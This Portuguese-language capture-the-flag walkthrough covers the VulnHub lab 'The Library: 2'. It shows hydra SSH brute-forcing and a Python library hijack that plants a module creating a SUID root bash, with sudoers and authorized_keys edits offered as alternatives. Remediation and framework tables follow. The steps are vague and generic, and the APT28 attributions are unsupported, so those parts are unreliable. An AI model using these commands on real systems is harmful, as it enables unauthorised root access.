# The Library: 2 — Mais Fundo nas Estantes

Bora rapaziada!! A sequência de The Library eleva a dificuldade. Esta aqui combina enumeração web, hijacking de biblioteca Python (sim, aquele truque de injeção de path) e um passo de movimento lateral antes do root. The Library: 2 é sensacional para ensinar um dos vetores de privesc no Linux mais subestimados: diretórios graváveis no caminho de busca de módulos Python. Sem mentira, isso aparece em avaliações reais muito mais do que as pessoas esperam.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | The Library: 2 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/the-library-2,lcb/ |
| **Técnicas** | Enumeração de serviços Nmap, brute-force de diretórios web, brute-force SSH ou descoberta de credenciais, hijacking de biblioteca Python (injeção sys.path), escalação de privilégios via cron |
| **CVEs** | CWE-427 (Elemento de Caminho de Busca Não Controlado: hijacking de biblioteca Python), CWE-732 (Atribuição Incorreta de Permissão para Recurso Crítico: diretório de script cron gravável), CWE-522 (Credenciais Insuficientemente Protegidas) |
| **Grupos APT** | APT28 (Fancy Bear): usa injeção em path Python para persistência e escalação de privilégios em servidores Linux; APT41: usa escalação via cron como técnica pós-exploração em ambientes Linux comprometidos |

---

## Resumo do Ataque

```
nmap → portas 22 (SSH), 80 (HTTP)
  → HTTP: aplicação web (possível WordPress ou CMS customizado)
  → gobuster: enumerar diretórios e arquivos
  → descoberta de credenciais via fonte web ou enumeração
  → SSH: acesso inicial como usuário de baixo privilégio
  → sudo -l ou enumeração SUID
  → script Python rodando como root via cron
  → diretório gravável no sys.path Python
  → hijacking de biblioteca Python: injetar módulo malicioso
  → cron aciona script → execução de código root
  → uid=0(root)
  → /root/flag.txt
```

---

## Metodologia

1. Descoberta de host e varredura completa de portas
2. Fingerprinting de aplicação web e enumeração de diretórios
3. Descoberta de credenciais via aplicação web ou enumeração
4. Acesso SSH inicial como usuário de baixo privilégio
5. Pós-exploração: enumerar sudo, SUID, cron jobs
6. Hijacking de biblioteca Python para escalação de privilégios
7. Captura da flag root

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.x

nmap -sV -sC -p- 192.168.1.x
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Dois serviços: SSH (objetivo final) e HTTP (superfície principal de ataque). Sem FTP desta vez: o aumento de dificuldade remove o vetor FTP fácil e força enumeração web e pós-exploração mais profundas.

**MITRE ATT&CK:** T1046 — Descoberta de Serviço de Rede

---

## Passo 2 — Enumeração da Aplicação Web

```bash
curl -s http://192.168.1.x/ | head -50

gobuster dir \
  -u http://192.168.1.x/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak \
  -t 40 \
  -o /tmp/library2_dirs.txt

# Para detecção WordPress:
wpscan --url http://192.168.1.x/ --enumerate u,p,t
```

Busque por: enumeração de usuários, páginas admin ocultas, arquivos de configuração no web root, arquivos de backup (`.bak`, `.old`, `~`).

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1595.002 — Varredura Ativa: Varredura de Vulnerabilidade

---

## Passo 3 — Descoberta de Credenciais e Acesso SSH Inicial

A aplicação web pode expor credenciais através de:
- Comentários no código-fonte com senhas
- Robots.txt revelando caminhos sensíveis
- Painel admin com credenciais padrão
- Enumeração de usuários WordPress levando a brute-force

```bash
# Enumeração de usuários WordPress:
wpscan --url http://192.168.1.x/ --enumerate u

# Brute-force SSH com usuários descobertos:
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.x -t 4
```

Depois de obter credenciais, conecte via SSH:

```bash
ssh <usuario>@192.168.1.x
```

**Nota real:** Enumeração de usuários via API REST do WordPress e mensagens de erro de login é um vetor de acesso inicial consistente. Organizações rodando WordPress sem hardening regularmente expõem listas de usuários que alimentam ataques de brute-force. APT28 especificamente usa instalações WordPress como alvos de acesso inicial.

**MITRE ATT&CK:** T1078 — Contas Válidas; T1110.001 — Força Bruta: Adivinhação de Senha

---

## Passo 4 — Enumeração Pós-Exploração

Com um shell no sistema, enumere vetores de escalação de privilégios sistematicamente:

```bash
# Direitos sudo
sudo -l

# Binários SUID
find / -perm -4000 -type f 2>/dev/null

# Diretórios graváveis
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | grep -v run

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Processos em execução
ps aux | grep root

# Scripts Python executados pelo root
find / -name "*.py" -user root -writable 2>/dev/null
```

O achado principal: um script Python é executado periodicamente como root (via cron). O script importa um módulo Python de um diretório que é gravável pelo usuário atual.

**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron; T1057 — Descoberta de Processos

---

## Passo 5 — Hijacking de Biblioteca Python

Python resolve importações de módulos buscando diretórios no `sys.path` em ordem. Se o primeiro diretório gravável no `sys.path` do script cron for gravável pelo usuário atual, você pode plantar um módulo malicioso que executa código arbitrário quando o cron job root o importa.

Identifique o script Python e suas importações:

```bash
cat /caminho/para/script_root.py
# Procure por: import <nome_modulo>
```

Verifique o sys.path do Python para a versão usada pelo script:

```bash
python3 -c "import sys; print(sys.path)"
# ou
python -c "import sys; print(sys.path)"
```

Encontre o diretório gravável que aparece antes da localização legítima do módulo:

```bash
ls -la /home/<usuario>/lib/
```

Crie um módulo malicioso no diretório gravável com o mesmo nome do módulo importado:

```bash
cat > /caminho/gravavel/<nome_modulo>.py << 'EOF'
import os

# Payload: criar bash SUID ou adicionar ao sudoers
os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
EOF
```

Aguarde o cron job executar (verifique o intervalo: geralmente 1-5 minutos), depois escale:

```bash
# Após o cron executar:
/tmp/rootbash -p
# uid=0(root)
```

**Payload alternativo:** Em vez de bash SUID, adicione o usuário ao /etc/sudoers ou escreva uma chave SSH em /root/.ssh/authorized_keys.

**Nota real:** Hijacking de biblioteca Python é uma das técnicas de escalação de privilégios Linux mais confiáveis em ambientes que executam automação Python como root. APT28 usa essa técnica para persistência em servidores Linux com scripts de gerenciamento baseados em Python.

**MITRE ATT&CK:** T1574.006 — Sequestro de Fluxo de Execução: Python Path; T1053.003 — Tarefa Agendada: Cron

---

## Passo 6 — Acesso Root e Flag

```bash
/tmp/rootbash -p
id
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. A seção mais profunda da Biblioteca está aberta.

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial SSH | descoberta via enumeração web | aplicação web / brute-force | acesso inicial SSH |
| Flag root | flag.txt | /root/flag.txt | conclusão |
| rootbash SUID | /tmp/rootbash | criado via hijack Python | shell root |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Credenciais expostas via enumeração web | Enumeração de usuários WordPress afeta milhões de sites em produção; mensagens de erro de login confirmam usuários válidos | Implemente mensagens de erro genéricas para falhas de autenticação; habilite proteção contra enumeração de usuários WordPress |
| 2 | Hijacking de biblioteca Python via diretório gravável | Cron jobs executando scripts Python como root com diretórios sys.path graváveis são uma configuração incorreta crítica | Execute scripts em virtualenvs controlados; garanta que diretórios sys.path sejam de propriedade do root e não graváveis pelo mundo |
| 3 | Escalação de privilégios via cron | Cron jobs executados como root com scripts ou dependências graváveis são exploráveis de forma consistente | Audite todos os cron jobs para problemas de permissão de arquivo |
| 4 | Hijacking de import Python | A ordem de resolução de módulos do Python torna qualquer diretório gravável antes dos caminhos do sistema um alvo de persistência | Defina PYTHONPATH explicitamente em ambientes cron; use imports absolutos; execute sob usuários restritos |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviço de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Descoberta | Descoberta | Descoberta de Processos | T1057 |
| Descoberta | Descoberta | Descoberta de Tarefa Agendada | T1053.003 |
| Escalação de Privilégios | Escalação de Privilégios | Sequestro de Fluxo de Execução: Python Path | T1574.006 |
| Escalação de Privilégios | Escalação de Privilégios | Tarefa Agendada: Cron | T1053.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Fortaleça a exposição de credenciais da aplicação web** — mensagens de erro de autenticação genéricas; desative enumeração de usuários WordPress; implemente bloqueio de conta
2. **Restrinja o sys.path Python para scripts cron** — execute em virtualenv dedicado; defina PYTHONPATH explicitamente; garanta que todos os diretórios sys.path sejam de propriedade do root e não graváveis por usuários não-root
3. **Audite permissões de arquivo de cron jobs** — scripts executados como root não devem ser graváveis por usuários não-root
4. **Aplique princípio de menor privilégio para cron** — cron jobs devem executar sob o usuário de menor privilégio que pode realizar a tarefa
5. **Aplique proteções contra brute-force** — fail2ban para SSH; políticas de bloqueio de conta para aplicações web

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os cron jobs e seus usuários de execução |
| Proteger | Controle de Acesso | Restringir diretórios de scripts cron; virtualenv para cron Python |
| Proteger | Gerenciamento de Identidade | Senhas fortes únicas; MFA para SSH onde possível |
| Detectar | Anomalias e Eventos | Alertar sobre falhas de cron job e execuções inesperadas de scripts Python |
| Responder | Planejamento de Resposta | Remover módulos maliciosos; rotacionar credenciais; reconstruir permissões cron |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-6 | Menor Privilégio | Cron jobs executam sob usuário mínimo necessário; sem root cron para tarefas não essenciais |
| CM-6 | Configurações | Fortalecer sys.path Python; restringir diretórios graváveis em ambientes cron |
| IA-5 | Gerenciamento de Autenticador | Proteções brute-force para SSH e autenticação web; senhas únicas |
| SI-7 | Integridade de Software e Firmware | Monitoramento de integridade de arquivos em scripts cron e módulos Python |

### CISA KEV

Hijacking de biblioteca Python e escalação de privilégios via cron mapeiam para padrões do Alerta CISA AA21-116A descrevendo técnicas pós-exploração de atores de ameaça em ambientes Linux. Organizações devem auditar configurações de cron job como parte de avaliações de segurança regulares.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Configurações de Ativos de TI | MIL2 |

### MITRE D3FEND

- **D3-EAL** — Lista de Execução Permitida (permitir scripts Python executados por cron; bloquear módulos inesperados)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (usuários cron com menor privilégio; hardening sys.path)
- **D3-FIM** — Monitoramento de Integridade de Arquivos (detectar modificações em módulos Python em caminhos cron)

---

## Considerações Finais

The Library: 2 ensina o tipo de escalação de privilégios que humilha pentesters experientes. Hijacking de biblioteca Python não é óbvio, requer entender como o Python resolve imports, e está em todo lugar em ambientes reais. Qualquer organização executando automação Python como root sem controles estritos de path está vulnerável.

A máquina respeita a convenção de sequência: entrada mais difícil, escalação mais sofisticada, o mesmo design limpo. Se Library 1 te ensinou a olhar para configs, Library 2 te ensina a olhar como scripts resolvem suas dependências.

Thanks guys!! (❍ᴥ❍ʋ)
